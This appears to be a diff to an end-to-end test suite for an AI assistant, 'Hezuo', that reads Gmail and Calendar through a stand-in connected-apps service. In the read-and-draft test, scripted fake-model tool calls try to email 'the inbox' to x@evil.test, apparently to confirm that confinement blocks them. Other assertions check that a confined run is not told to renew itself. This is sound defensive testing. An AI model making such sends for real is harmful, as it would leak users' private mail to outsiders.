@@ -1,11 +1,15 @@
-import { existsSync, readFileSync, writeFileSync } from "node:fs";
+import { spawn, type ChildProcess } from "node:child_process";
+import { closeSync, existsSync, openSync, readFileSync, writeFileSync } from "node:fs";
+import { createServer } from "node:http";
+import type { AddressInfo } from "node:net";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
 import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
 
 import { widgetActions, type WidgetRoot } from "../../packages/shared/widget.ts";
-import { launchVerificationServer } from "../../scripts/control-omb.ts";
+import { launchVerificationServer, verificationServerArgs, verificationServerEnvironment } from "../../scripts/control-hezuo.ts";
 import { startFakeConnectedApps, type FakeConnectedApps } from "./testing/fake-connected-apps.ts";
+import { waitForExit } from "./testing/cleanup.ts";
 
 // The proactive main agent end to end on a real server (temporary home, the fake Claude CLI) against a stand-in for the
 // connected-apps service: Hezuo's default watch, its checks, the one batched run, the brief, Dismiss, presence and
@@ -33,6 +37,90 @@ function client(fixture: Fixture) {
   };
 }
 
+// Match the direct project API fixture in connected-app-tools.e2e.test.ts. The old broker is only the MCP upstream.
+async function launchConnectedFixture(apps: FakeConnectedApps, parentEnv: NodeJS.ProcessEnv): Promise<Fixture> {
+  let config: Record<string, unknown> = {};
+  const server = createServer(async (req, res) => {
+    const path = new URL(req.url ?? "/", "http://fixture").pathname;
+    let raw = "";
+    for await (const chunk of req) raw += chunk;
+    const reply = (status: number, body: unknown) => {
+      res.writeHead(status, { "content-type": "application/json" });
+      res.end(JSON.stringify(body));
+    };
+    if (path === "/mcp") {
+      const upstream = await fetch(`${apps.url}/v1/mcp`, { method: req.method, headers: { "content-type": "application/json" }, body: raw || undefined });
+      res.writeHead(upstream.status, Object.fromEntries(upstream.headers));
+      return res.end(await upstream.text());
+    }
+    if (req.headers["x-api-key"] !== "ak_app_tools_fixture") return reply(401, { error: "invalid project key" });
+    if (path === "/api/v3.1/auth_configs" || path === "/api/v3/toolkits") return reply(200, { items: [] });
+    const slugs = ["gmail", "googlecalendar"].filter((slug) => apps.connected[slug]);
+    if (path === "/api/v3.1/connected_accounts") return reply(200, { items: slugs.map((slug) => ({ id: `ca_${slug}`, status: "ACTIVE", toolkit: { slug } })) });
+    if (path === "/api/v3.1/tool_router/session/trs_app_tools/toolkits") return reply(200, { items: slugs.map((slug) => ({ slug, connected_account: { id: `ca_${slug}`, status: "ACTIVE" } })) });
+    if (path === "/api/v3.1/tool_router/session" || path === "/api/v3.1/tool_router/session/trs_app_tools") {
+      if (raw) config = { ...config, ...JSON.parse(raw) };
+      return reply(req.method === "POST" ? 201 : 200, { session_id: "trs_app_tools", mcp: { type: "http", url: `${origin}/mcp` }, config });
+    }
+    return reply(404, { error: `Unexpected direct Composio request: ${req.method} ${path}` });
+  });
+  await new Promise<void>((resolve, reject) => {
+    server.once("error", reject);
+    server.listen(0, "127.0.0.1", resolve);
+  });
+  const origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
+  let fixture: Fixture | undefined;
+  let restarted: ChildProcess | undefined;
+  const close = async () => {
+    try {
+      if (restarted) await waitForExit(restarted, { signal: "SIGTERM" });
+    } finally {
+      try { await fixture?.close(); } finally {
+        await new Promise<void>((resolve) => {
+          server.closeAllConnections();
+          server.close(() => resolve());
+        });
+      }
+    }
+  };
+  try {
+    fixture = await launchVerificationServer(parentEnv);
+    // Backend overrides are deliberately stripped by the launcher; restart its owned home with loopback endpoints.
+    await waitForExit(fixture.child, { signal: "SIGTERM" });
+    // Seed only the owned fixture's config while stopped, so the key can never reach the default remote backend.
+    const configPath = join(fixture.info.dataDir, "config.json");
+    const savedConfig: Record<string, unknown> = JSON.parse(readFileSync(configPath, "utf8"));
+    writeFileSync(configPath, JSON.stringify({ ...savedConfig, composio: { apiKey: "ak_app_tools_fixture" } }));
+    const env = { ...verificationServerEnvironment(parentEnv, fixture.info.dataDir, Number(new URL(fixture.info.url).port)),
+      HEZUO_COMPOSIO_API: `${origin}/api/v3.1`, HEZUO_COMPOSIO_TOOLKITS_API: `${origin}/api/v3` };
+    const log = openSync(fixture.info.logPath, "a", 0o600);
+    try {
+      restarted = spawn(process.execPath, verificationServerArgs(env), { env, stdio: ["ignore", log, log] });
+    } finally { closeSync(log); }
+    const url = fixture.info.url;
+    const deadline = Date.now() + 30_000;
+    let ready = false;
+    let lastFailure: unknown;
+    while (Date.now() < deadline) {
+      if (restarted.exitCode !== null || restarted.signalCode !== null) {
+        throw new Error(`Connected fixture exited before readiness; see ${fixture.info.logPath}`);
+      }
+      try {
+        const response = await fetch(`${url}/api/health`, { signal: AbortSignal.timeout(Math.max(1, Math.min(1_000, deadline - Date.now()))) });
+        if (response.ok) { ready = true; break; }
+        lastFailure = `HTTP ${response.status}`;
+      } catch (error) { lastFailure = error; }
+      // This is a real child server: fake timers cannot advance its HTTP readiness.
+      await new Promise<void>((resolve) => setTimeout(resolve, 150));
+    }
+    if (!ready) throw new Error(`Connected fixture did not become healthy: ${String(lastFailure)}; see ${fixture.info.logPath}`);
+    return { ...fixture, close };
+  } catch (error) {
+    await close();
+    throw error;
+  }
+}
+
 function inbox(apps: FakeConnectedApps, now: number) {
   apps.emails = [{
     messageId: "important-1", threadId: "thread-important", messageTimestamp: new Date(now - 5 * MINUTE).toISOString(),
@@ -53,13 +141,13 @@ describe("Hezuo keeps an eye on the day, hidden from the sidebar", () => {
   let api: ReturnType<typeof client>;
   let chief: { id: string; threadId: string };
   let watch: { id: string };
-  const markers = join(tmpdir(), `omb-watch-markers-${process.pid}-${Date.now()}.json`);
+  const markers = join(tmpdir(), `hezuo-watch-markers-${process.pid}-${Date.now()}.json`);
 
   beforeAll(async () => {
     vi.spyOn(console, "warn").mockImplementation(() => {});
     apps = await startFakeConnectedApps();
     writeFileSync(markers, JSON.stringify({ "Your checks found what is below": WATCH_REPLY }));
-    fixture = await launchVerificationServer({ ...process.env, TZ: MIDDAY_ZONE, OMB_COMPOSIO_BROKER_URL: apps.url, OMB_COMPOSIO_BROKER_TOKEN: apps.token, FAKE_CLAUDE_MARKER_REPLIES: markers });
+    fixture = await launchConnectedFixture(apps, { ...process.env, TZ: MIDDAY_ZONE, FAKE_CLAUDE_MARKER_REPLIES: markers });
     api = client(fixture);
     const bots = (await api("GET", "/api/bots")).bots as any[];
     const found = bots.find((bot) => bot.defaultBot && !bot.defaultBot.person);
@@ -199,7 +287,7 @@ describe("a read-and-draft run", () => {
     vi.spyOn(console, "warn").mockImplementation(() => {});
     apps = await startFakeConnectedApps();
     const multi = (slug: string, args: Record<string, unknown>) => ({ name: "COMPOSIO_MULTI_EXECUTE_TOOL", server: "composio", input: { tools: [{ tool_slug: slug, arguments: args }] } });
-    fixture = await launchVerificationServer({ ...process.env, OMB_COMPOSIO_BROKER_URL: apps.url, OMB_COMPOSIO_BROKER_TOKEN: apps.token,
+    fixture = await launchConnectedFixture(apps, { ...process.env,
       FAKE_CLAUDE_TOOL_CALLS: JSON.stringify([
         multi("GMAIL_SEND_EMAIL", { recipient_email: "x@evil.test", body: "the inbox" }),
         multi("GMAIL_CREATE_EMAIL_DRAFT", { thread_id: "thread-important", recipient_email: "x@evil.test", body: "the inbox" }),
@@ -235,9 +323,12 @@ describe("a read-and-draft run", () => {
     await expect.poll(() => existsSync(join(fixture.info.dataDir, "decisions", `${month}.ndjson`)), { timeout: 5_000 }).toBe(true);
     const decisions = readFileSync(join(fixture.info.dataDir, "decisions", `${month}.ndjson`), "utf8");
     const dump = JSON.parse(readFileSync(fixture.fixtureDumpPath, "utf8"));
-    expect(Object.keys(dump.mcpConfig.mcpServers).sort()).toEqual(["agents", "composio", "ogb"]);
+    expect(Object.keys(dump.mcpConfig.mcpServers).sort()).toEqual(["agents", "composio", "hezuo"]);
     expect(dump.systemPrompt).not.toContain("Your enabled automations");
     expect(dump.systemPrompt).not.toContain("Pause a temporary monitor");
+    // A confined run must not be told to renew itself when its usage limit is reached.
+    expect(dump.systemPrompt).not.toContain("set up its continuation yourself");
+    expect(dump.systemPrompt).not.toContain("trigger action=create when=limit_reset");
     expect(dump.systemPrompt).toContain("within its read-and-draft limits");
     const read = transcript.find((message) => message.kind === "activity" && String(message.tool?.output).includes("GMAIL_FETCH_EMAILS"));
     expect(String(read.tool.output)).toContain("[Records from a connected app (Gmail or Google Calendar).");
